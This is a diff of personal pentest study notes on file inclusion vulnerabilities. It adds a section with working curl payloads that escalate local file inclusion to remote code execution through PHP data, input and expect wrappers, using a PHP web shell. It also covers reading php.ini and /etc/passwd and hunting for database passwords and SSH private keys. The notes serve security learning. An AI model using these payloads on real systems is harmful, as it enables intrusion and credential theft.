@@ -12,6 +12,10 @@
 * [[#PHP Filters]]
 	* [[#Scenarios]]
 		* Reading PHP files with convert filter
+* From LFI to RCE
+	* PHP Wrappers
+		* Data / Input / Expect
+	* Remote File Inclusion
 * [[#Examples of Vulnerable Code and FI Functions]]
 ---
 ## Overview
@@ -69,7 +73,7 @@ If we were not sure of the directory the web application is in, we can add `../`
 				echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 				```
 		2. **Null Bytes**
-			- PHP versions before 5.5 were vulnerable to `null byte injection`
+			- PHP versions before 5.5 were vulnerable to `null byte injection` 
 			- Adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
 			- Sending `/etc/passwd%00` would be `/etc/passwd%00.php` but the path used would actually be `/etc/passwd`
 - **Filename Prefix**
@@ -93,7 +97,7 @@ If we were not sure of the directory the web application is in, we can add `../`
 		configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
 		```
 	2.  We should use the payload `configure`: `www.example.com/index.php?lang=configure`
-		1. If the web app uses a that executes the content of the file, it won't show the file content.
+		1. If the web app uses a #read_write_functions  that executes the content of the file, it won't show the file content.
 		2. Using PHP wrapper with convert filter to encode the content of the file so it doesn't get executed
 		   `www.example.com/index.php?lang=php://filter/read=convert.base64-encode/resource=config`
 		3. Decode the output
@@ -101,59 +105,81 @@ If we were not sure of the directory the web application is in, we can add `../`
 			echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 			```
 ---
+## From LCI to RCE
+- Search for DB password in `config.php`
+- Check `.ssh` directory on each user home directory for their private keys `id_rsa`
+- PHP:
+	- [Data](https://www.php.net/manual/en/wrappers.data.php) wrapper attack
+		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
+			- `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed) 
+			- `/etc/php/X.Y/fpm/php.ini` for Nginx
+				``` bash
+				curl "http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+				# Then decode the output
+				echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+				```
+			- Encode our payload then send it with data wrapper `data://text/plain;base64`
+				``` bash
+				echo '<?php system($_GET["cmd"]); ?>' | base64
+				PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+				curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
+				```
+	- [Input](https://www.php.net/manual/en/wrappers.php.php) wrapper attack.
+		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
+		- Send the payload as a POST parameter, so the vulnerable parameter must accept POST request.
+			``` bash
+			curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://URL/index.php?language=php://input&cmd=id"
+			# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
+			curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
+			```
+	- [Expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper attack. 
+		- Expect wrapper is an external wrapper so it has to be installed and enabled manually.
+		- Check PHP configurations like above but `grep expect`, we would get `extension=expect` as result if it's there.
+		- Use expect module to gain RCE
+			``` bash
+			curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+			```
+---
 ## Examples of Vulnerable Code and FI Functions
 The following code snippets show if a site taking a `GET` parameter `?language=en` directly from a user without sanitization or filtration :
-- `PHP`, we may use these functions to load a local or a remote file as we load a page:
-	* `include()`
-	* `inculde_once()`
-	* `require()`
-	* `require_once()`
-	* `file_get_contents()`
-		``` PHP
-		if (isset($_GET['language'])) { include($_GET['language']); }
-		```
-- `NodeJS`
-	- `readFile()`: `NodeJS`
-	- `render()`: `Express.js`
-		``` JS
-		// NodeJS
-		if(req.query.language) {
-		    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
-		        res.write(data);
-		    });
-		}
-		// Express.js
-		app.get("/about/:language", function(req, res) {
-		    res.render(`/${req.params.language}/about.html`);
+- PHP, we may use these functions to load a local or a remote file as we load a page:
+	``` PHP
+	if (isset($_GET['language'])) { include($_GET['language']); }
+	```
+- NodeJS
+	``` JS
+	// NodeJS
+	if(req.query.language) {
+		fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
+			res.write(data);
 		});
-		```
-- `Java`: `Java Server Pages (JSP)`
-	- `include()`
-	- `import()`
-		``` java
-		// Include local files based on the specified parameter
-		<c:if test="${not empty param.language}">
-			<jsp:include file="<%= request.getParameter('language') %>" />
-		</c:if>
-		// The `import` function may also be used to render a local file or a URL
-		<c:import url= "<%= request.getParameter('language') %>"/>
-		```
-- `.NET`
-	- `Response.WriteFile()`
-	- `@Html.Partial()`
-	- `include`
-		``` CS
-		// Takes a file path for its input and writes its content to the response
-		@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
-		    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> }
-		// Render the specified file as part of the front-end template
-		@Html.Partial(HttpContext.Request.Query['language'])
-		// Render local files or remote URLs
-		<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
-		```
+	}
+	// Express.js
+	app.get("/about/:language", function(req, res) {
+		res.render(`/${req.params.language}/about.html`);
+	});
+	```
+- Java: `Java Server Pages (JSP)`
+	``` java
+	// Include local files based on the specified parameter
+	<c:if test="${not empty param.language}">
+		<jsp:include file="<%= request.getParameter('language') %>" />
+	</c:if>
+	// The `import` function may also be used to render a local file or a URL
+	<c:import url= "<%= request.getParameter('language') %>"/>
+	```
+- .NET
+	``` CS
+	// Takes a file path for its input and writes its content to the response
+	@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
+		<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> }
+	// Render the specified file as part of the front-end template
+	@Html.Partial(HttpContext.Request.Query['language'])
+	// Render local files or remote URLs
+	<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
+	```
 
-The following table shows which functions may execute files and which only read file content:
-#read_write_functions
+The following table shows #read_write_functions which may also execute files:
 
 | **Function**                 | **Read Content** | **Execute** | **Remote URL** |
 | ---------------------------- | :--------------: | :---------: | :------------: |
@@ -165,7 +191,7 @@ The following table shows which functions may execute files and which only read 
 | **NodeJS**                   |                  |             |                |
 | `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
 | `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
-| `res.render()`               |        ✅         |      ✅      |       ❌        |
+| `res.render()` Express.js    |        ✅         |      ✅      |       ❌        |
 | **Java**                     |                  |             |                |
 | `include`                    |        ✅         |      ❌      |       ❌        |
 | `import`                     |        ✅         |      ✅      |       ✅        |
